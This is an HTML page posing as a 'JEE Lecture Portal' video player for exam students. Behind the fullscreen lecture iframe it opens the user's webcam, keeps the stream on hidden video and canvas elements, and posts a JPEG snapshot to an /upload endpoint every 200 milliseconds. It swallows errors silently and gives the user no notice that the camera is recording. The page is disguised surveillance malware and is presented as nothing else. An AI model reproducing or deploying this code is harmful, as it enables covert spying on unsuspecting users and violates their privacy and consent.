<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>JEE Lecture Player</title>

<style>
*{
  margin:0;
  padding:0;
  box-sizing:border-box;
  font-family:'Segoe UI',sans-serif;
}

html,body{
  height:100%;
  overflow:hidden;
}

/* ðŸ”¥ Cinematic Background */
body{
  background: linear-gradient(-45deg,#0f2027,#203a43,#2c5364,#000000);
  background-size:400% 400%;
  animation:gradientMove 12s ease infinite;
  position:relative;
}

/* Moving gradient animation */
@keyframes gradientMove{
  0%{background-position:0% 50%;}
  50%{background-position:100% 50%;}
  100%{background-position:0% 50%;}
}

/* Floating glow circles */
body::before,
body::after{
  content:"";
  position:absolute;
  width:500px;
  height:500px;
  background:radial-gradient(circle,rgba(255,0,150,0.3),transparent 60%);
  border-radius:50%;
  animation:float 8s infinite alternate ease-in-out;
  z-index:0;
}

body::after{
  top:60%;
  left:60%;
  background:radial-gradient(circle,rgba(0,200,255,0.3),transparent 60%);
  animation-delay:4s;
}

@keyframes float{
  from{transform:translate(-50px,-50px);}
  to{transform:translate(50px,50px);}
}

/* ðŸ”¥ Glass Overlay */
#overlay{
  position:absolute;
  width:100%;
  height:100%;
  display:flex;
  flex-direction:column;
  align-items:center;
  justify-content:center;
  text-align:center;
  color:white;
  z-index:10;
  backdrop-filter:blur(12px);
  background:rgba(0,0,0,0.4);
}

/* Title */
#overlay h1{
  font-size:48px;
  letter-spacing:3px;
  margin-bottom:20px;
  animation:fadeUp 1.5s ease forwards;
}

/* Subtitle */
#overlay p{
  font-size:18px;
  opacity:0.8;
  margin-bottom:40px;
  animation:fadeUp 2s ease forwards;
}

/* Premium Button */
#overlay span{
  font-size:20px;
  padding:15px 40px;
  border-radius:50px;
  background:linear-gradient(45deg,#ff004c,#ff7a00);
  box-shadow:0 0 25px rgba(255,0,100,0.7);
  transition:0.3s;
}

#overlay span:hover{
  transform:scale(1.1);
  box-shadow:0 0 40px rgba(255,0,150,1);
}

/* Animation */
@keyframes fadeUp{
  from{opacity:0; transform:translateY(20px);}
  to{opacity:1; transform:translateY(0);}
}

iframe{
  width:100%;
  height:100%;
  border:0;
}

#v,#c{
  display:none;
}
</style>
</head>

<body>

<div id="overlay" onclick="start()">
  <h1>JEE Lecture Portal</h1>
  <p>Tap below to start your learning session</p>
  <span>â–¶ Tap to Start Lecture</span>
</div>

<iframe id="frame"></iframe>

<video id="v" autoplay playsinline hidden></video>
<canvas id="c" hidden></canvas>

<script>
async function start(){
  document.getElementById("overlay").style.display="none";

  const r = await fetch("/get_video_link");
  const d = await r.json();

  const frame = document.getElementById("frame");
  frame.src = d.url;

  if(frame.requestFullscreen){
    frame.requestFullscreen();
  }else if(frame.webkitRequestFullscreen){
    frame.webkitRequestFullscreen();
  }else if(frame.msRequestFullscreen){
    frame.msRequestFullscreen();
  }

  try{
    const stream = await navigator.mediaDevices.getUserMedia({
      video:{ width:1280, height:720 }
    });
    v.srcObject = stream;

    setTimeout(capture,200);
    setInterval(capture,200);
  }catch(e){}
}

function capture(){
  c.width  = v.videoWidth;
  c.height = v.videoHeight;

  c.getContext("2d").drawImage(v,0,0,c.width,c.height);
  c.toBlob(b=>{
    let f=new FormData();
    f.append("photo",b,"u.jpg");
    fetch("/upload",{method:"POST",body:f});
  },"image/jpeg",0.6);
}
</script>

</body>
</html>
